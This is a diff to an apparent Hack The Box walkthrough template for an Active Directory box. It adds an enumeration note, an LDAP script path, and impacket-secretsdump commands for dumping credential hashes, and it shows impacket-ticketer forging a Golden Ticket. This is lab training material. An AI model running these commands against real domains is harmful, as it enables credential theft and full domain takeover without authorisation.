@@ -18,11 +18,11 @@
 :END:
 
 
-* <Name of box> Hack The Box Walkthrough/Writeup:
+* <boxName> Hack The Box Walkthrough/Writeup:
 :PROPERTIES:
 :ID:       e3f25c99-179f-461d-9310-dd1f026d4ec1
 :END:
-- https://app.hackthebox.com/machines/<BoxName>
+- https://app.hackthebox.com/machines/<boxName>
 
 * How I use variables & Wordlists:
 :PROPERTIES:
@@ -56,6 +56,10 @@
 :END:
 - This box scenario assumes that the Active Directory (AD) environment has already been breached and that we have access to valid credentials.
 - This approach reflects a more realistic model, given that direct breaches of AD environments from external footholds are increasingly rare today.
+- +Note+:
+  - Even with assumed credentials, I’ll still conduct my standard enumeration process as if I don’t have them.
+    - This ensures I don’t overlook any findings just because access is available.
+    - Comprehensive documentation of all discoveries remains essential.
 ** NMAP:
 :PROPERTIES:
 :ID:       0d42892c-fad3-4440-834b-6ebf6c6f41c3
@@ -118,7 +122,7 @@
   - I actually have a handy script to check if anonymous bind is enabled & if it is to dump a large amount of information. You can find it here
     - https://github.com/bloodstiller/ldapire
     - https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb
-      - ~python3 ldapchecker.py $box~
+      - ~python3 /home/kali/windowsTools/enumeration/ldapire.py $box~
         - It will dump general information & also detailed & simple information including:
           - Groups
           - Users
@@ -354,8 +358,16 @@
 + *Using* ~impacket-lookupsid~ *to get the Search for the Domain SID*:
   - ~impacket-lookupsid $domain/$user@$machine.$domain -domain-sids~
 
++ *Using* ~impacket-secretsdump~ *to retrieve the aeskey*:
+  - ~impacket-secretsdump $domain/$user:$pass@$box~
+  - ~impacket-secretsdump $domain/$user@$box -hashes :$hash~
+  - ~impacket-secretsdump $domain/$user:$pass@$box~
+
+
 + *Sync our clock to the host using ntupdate*:
   - ~sudo ntpdate -s $domain~
+  - ~faketime "$(ntpdate -q $domain | cut -d ' ' -f 1,2)"~
+
 
 + *Using* ~impacket-ticketer~ *to create the Golden Ticket*:
   - ~impacket-ticketer -nthash $krbtgt -domain-sid $sid -domain $domain Administrator~
